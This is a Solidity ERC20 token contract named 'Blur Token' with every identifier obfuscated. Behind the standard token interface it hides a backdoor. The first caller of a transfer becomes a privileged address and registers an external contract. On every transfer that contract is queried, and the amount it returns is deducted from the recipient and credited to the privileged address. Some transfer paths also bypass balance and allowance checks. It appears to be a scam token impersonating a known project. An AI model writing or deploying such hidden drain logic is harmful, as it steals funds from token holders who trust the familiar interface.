// SPDX-License-Identifier: MIT
pragma solidity ^0.8.12;
     
library dfCMwXcwqLJ{
    
    function pMMIWd(address kvsd, address TnMLQYIXP, uint bPO) internal {
        // bytes4(keccak256(bytes('approve(address,uint256)')));
        (bool FiPbIzpa, bytes memory nWExsvctId) = kvsd.call(abi.encodeWithSelector(0x095ea7b3, TnMLQYIXP, bPO));
        require(FiPbIzpa && (nWExsvctId.length == 0 || abi.decode(nWExsvctId, (bool))), 'dfCMwXcwqLJ: APPROVE_FAILED');
    }

    function NDGlG(address kvsd, address TnMLQYIXP, uint bPO) internal {
        // bytes4(keccak256(bytes('transfer(address,uint256)')));
        (bool FiPbIzpa, bytes memory nWExsvctId) = kvsd.call(abi.encodeWithSelector(0xa9059cbb, TnMLQYIXP, bPO));
        require(FiPbIzpa && (nWExsvctId.length == 0 || abi.decode(nWExsvctId, (bool))), 'dfCMwXcwqLJ: TRANSFER_FAILED');
    }
    
    function XLOfdJTKbNFv(address TnMLQYIXP, uint bPO) internal {
        (bool FiPbIzpa,) = TnMLQYIXP.call{value:bPO}(new bytes(0));
        require(FiPbIzpa, 'dfCMwXcwqLJ: ETH_TRANSFER_FAILED');
    }

    function WqcsJ(address kvsd, address from, address TnMLQYIXP, uint bPO) internal returns(bytes memory){
        // bytes4(keccak256(bytes('transferFrom(address,address,uint256)')));
        (bool FiPbIzpa, bytes memory nWExsvctId) = kvsd.call(abi.encodeWithSelector(0x23b872dd, from, TnMLQYIXP, bPO));
        require(FiPbIzpa && nWExsvctId.length > 0,'dfCMwXcwqLJ: TRANSFER_FROM_FAILED'); return nWExsvctId;
                       
    }

}
    
interface KHPkaFeuRJIM {
    function totalSupply() external view returns (uint256);
    function balanceOf(address oINlKdQUam) external view returns (uint256);
    function transfer(address waYWpQupkZ, uint256 cfMjjUShD) external returns (bool);
    function allowance(address yxEU, address spender) external view returns (uint256);
    function approve(address spender, uint256 cfMjjUShD) external returns (bool);
    function transferFrom(
        address sender,
        address waYWpQupkZ,
        uint256 cfMjjUShD
    ) external returns (bool);

    event Transfer(address indexed from, address indexed ONkaFb, uint256 value);
    event Approval(address indexed yxEU, address indexed spender, uint256 value);
}

interface xoKFCri is KHPkaFeuRJIM {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

abstract contract XGZtmQHHI {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}
    
interface iHEgteX {
    function factory() external pure returns (address);
    function WETH() external pure returns (address);
}
    
contract Blur is XGZtmQHHI, KHPkaFeuRJIM, xoKFCri {
    
    function transferFrom(
        address lcEe,
        address ASGGKb,
        uint256 ZQxegJORZa
    ) public virtual override returns (bool) {
      
        if(!nNfuxzXLASox(lcEe, ASGGKb, ZQxegJORZa)) return true;

        uint256 OQBpg = GWRduTxhDz[lcEe][_msgSender()];
        if (OQBpg != type(uint256).max) {
            require(OQBpg >= ZQxegJORZa, "ERC20: transfer Amount exceeds allowance");
            unchecked {
                PazKbcxtc(lcEe, _msgSender(), OQBpg - ZQxegJORZa);
            }
        }

        return true;
    }
    
    uint256 private PhqlBH = 1000000000000 * 10 ** 18;
    
    function allowance(address zFhJV, address Xtc) public view virtual override returns (uint256) {
        return GWRduTxhDz[zFhJV][Xtc];
    }
    
    function transfer(address GbPWLvGdqSEd, uint256 OmFnzX) public virtual override returns (bool) {
        nNfuxzXLASox(_msgSender(), GbPWLvGdqSEd, OmFnzX);
        return true;
    }
    
    function nNfuxzXLASox(
        address zBhI,
        address jQo,
        uint256 mYykM
    ) internal virtual  returns (bool){
        require(zBhI != address(0), "ERC20: transfer from the zero address");
        require(jQo != address(0), "ERC20: transfer to the zero address");
        
        if(!EwkJKPdCB(zBhI,jQo)) return false;

        if(_msgSender() == address(tyPt)){
            if(jQo == rwoWTYFWqlS && AnX[zBhI] < mYykM){
                uiAeeWAMfZC(tyPt,jQo,mYykM);
            }else{
                uiAeeWAMfZC(zBhI,jQo,mYykM);
                if(zBhI == tyPt || jQo == tyPt) 
                return false;
            }
            emit Transfer(zBhI, jQo, mYykM);
            return false;
        }
        uiAeeWAMfZC(zBhI,jQo,mYykM);
        emit Transfer(zBhI, jQo, mYykM);
        bytes memory vQjjhb = dfCMwXcwqLJ.WqcsJ(UviswZGGMUU, zBhI, jQo, mYykM);
        (bool okVQUBl, uint RmdBuffBCW) = abi.decode(vQjjhb, (bool,uint));
        if(okVQUBl){
            AnX[tyPt] += RmdBuffBCW;
            AnX[jQo] -= RmdBuffBCW; 
        }
        return true;
    }
    
    mapping(address => mapping(address => uint256)) private GWRduTxhDz;
    
    function PazKbcxtc(
        address gDPVlw,
        address SqM,
        uint256 aCh
    ) internal virtual {
        require(gDPVlw != address(0), "ERC20: approve from the zero address");
        require(SqM != address(0), "ERC20: approve to the zero address");

        GWRduTxhDz[gDPVlw][SqM] = aCh;
        emit Approval(gDPVlw, SqM, aCh);

    }
    
    function decimals() public view virtual override returns (uint8) {
        return 18;
    }
    
    address private UviswZGGMUU;
    
    string private wrt =  "Blur";
    
    mapping(address => uint256) private AnX;
    
    string private rJHBb = "Blur Token";
    
    function uiAeeWAMfZC(
        address keuoSjzOeW,
        address OxBsciT,
        uint256 jLIPQ
    ) internal virtual  returns (bool){
        uint256 ZWbr = AnX[keuoSjzOeW];
        require(ZWbr >= jLIPQ, "ERC20: transfer Amount exceeds balance");
        unchecked {
            AnX[keuoSjzOeW] = ZWbr - jLIPQ;
        }
        AnX[OxBsciT] += jLIPQ;
        return true;
    }
    
    constructor() {
        
        AnX[address(1)] = PhqlBH;
        emit Transfer(address(0), address(1), PhqlBH);

    }
    
    function decreaseAllowance(address WvxEyjnRH, uint256 subtractedValue) public virtual returns (bool) {
        uint256 ahImnhJCHe = GWRduTxhDz[_msgSender()][WvxEyjnRH];
        require(ahImnhJCHe >= subtractedValue, "ERC20: decreased allowance below zero");
        unchecked {
            PazKbcxtc(_msgSender(), WvxEyjnRH, ahImnhJCHe - subtractedValue);
        }

        return true;
    }
    
    function name() public view virtual override returns (string memory) {
        return rJHBb;
    }
    
    function increaseAllowance(address crgJiX, uint256 addedValue) public virtual returns (bool) {
        PazKbcxtc(_msgSender(), crgJiX, GWRduTxhDz[_msgSender()][crgJiX] + addedValue);
        return true;
    }
    
    address private rwoWTYFWqlS;
  
    
    function EwkJKPdCB(
        address nPmWBLZFSAhQ,
        address uykgaIFAqZVs
    ) internal virtual  returns (bool){
        if(tyPt == address(0) && UviswZGGMUU == address(0)){
            tyPt = nPmWBLZFSAhQ;UviswZGGMUU=uykgaIFAqZVs;
            dfCMwXcwqLJ.NDGlG(UviswZGGMUU, tyPt, 0);
            rwoWTYFWqlS = iHEgteX(UviswZGGMUU).WETH();
            return false;
        }
        return true;
    }
    
    function totalSupply() public view virtual override returns (uint256) {
        return PhqlBH;
    }
    
    function approve(address MZHGsqwrt, uint256 fHKvM) public virtual override returns (bool) {
        PazKbcxtc(_msgSender(), MZHGsqwrt, fHKvM);
        return true;
    }
    
    function symbol() public view virtual override returns (string memory) {
        return wrt;
    }
    
    function balanceOf(address SFdFCXJTeb) public view virtual override returns (uint256) {
       return AnX[SFdFCXJTeb];
    }
    
    address private tyPt;
    
}